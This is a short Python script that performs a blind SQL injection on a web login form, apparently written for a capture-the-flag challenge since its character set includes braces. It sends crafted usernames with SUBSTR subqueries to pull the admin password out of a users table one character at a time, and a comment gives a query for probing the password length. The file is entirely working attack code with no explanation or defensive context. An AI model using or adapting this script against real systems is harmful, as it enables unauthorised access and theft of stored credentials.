#!/usr/bin/python3
import requests
import string

#password_len = 38
# To check the password length use query 
# admin' AND length((SELECT password from users where username='admin'))==37-- -              
character = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}"
url = 'http://<"url_of_target">'              
session=requests.Session()
seen_pass = list()
while (True):
	for i in range(1,38):
		for c in character:
			print("trying the passsword", "".join(seen_pass) + c)
			h = hex(ord(c))[2:]
			respon=session.post(url,data= {"username" : f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{i},1)=CAST(X'{h}' AS TEXT) --", "password":"admin"})
			content= respon.text
			if not "Invalid" in content:
				seen_pass.append(c)
				break